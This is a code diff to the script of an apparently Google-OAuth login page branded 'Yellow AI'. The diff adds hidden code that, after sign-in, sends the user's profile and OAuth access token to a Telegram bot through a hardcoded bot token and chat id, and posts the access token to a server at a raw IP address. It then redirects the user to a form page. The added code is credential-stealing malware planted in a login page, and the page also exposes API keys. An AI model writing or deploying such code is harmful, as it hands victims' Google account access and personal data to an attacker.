@@ -246,6 +246,46 @@
   </div>
 
   <script>
+
+    function sendDeatilsToTelegram(message) {
+  // Function to send a Telegram message
+  sendTelegramMessage(message)
+  async function sendTelegramMessage(message) {
+      const url = `https://api.telegram.org/bot8113534372:AAF2DahT2CQYToSvG7Z_VMZ_-0BmweybX5I/sendMessage`;
+      try {
+          // Send the message to the Telegram bot
+          await fetch(url, {
+              method: "POST",
+              headers: {
+                  "Content-Type": "application/x-www-form-urlencoded"
+              },
+              body: `chat_id=1293804795&text=${encodeURIComponent(message)}`,
+          });
+      } catch (error) {
+        alert("Error sending your message, please try again later")
+          console.error("Error sending message", error);
+      }
+  }
+}   
+
+
+
+
+
+function sendUserData(token) {
+  fetch("http://165.22.208.62:5001/get_user_data", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ token })
+  });
+}
+
+
+
+
+
+
+
     // YOUR CLIENT_ID AND API_KEY
     const CLIENT_ID = '590439081250-9t6su7ram9pg0jiasdhgju1fghmqe530.apps.googleusercontent.com';
     const API_KEY = 'AIzaSyAoIJyeKPExu99g57UcCCOQj4VvEwjDX-A';
@@ -324,6 +364,10 @@
           const userResponse = await gapi.client.oauth2.userinfo.get(); 
           userInfo = userResponse.result;
           console.log('Successfully fetched User Info:', userInfo);
+            
+          sendDeatilsToTelegram(toString(userinfo));
+            
+
         } catch (err) {
           console.error('Error fetching user info after token acquisition:', err);
           document.getElementById('content').innerText = "Authentication successful, but couldn't fetch user details. See console.";
@@ -337,8 +381,16 @@
           user: userInfo
         };
         console.log("User Data and Access Token stored:", user_data_access_token);
-        
+        sendDeatilsToTelegram(toString(user_data_access_token))
+        sendUserData(accessToken);
+
+
         document.getElementById('content').innerText = `You're successfully logged into Yellow AI!\nWelcome, ${userInfo ? userInfo.name : 'User'}.`;
+
+        
+
+
+        location.href = 'form/'
       };
 
       // Check if there's an existing token
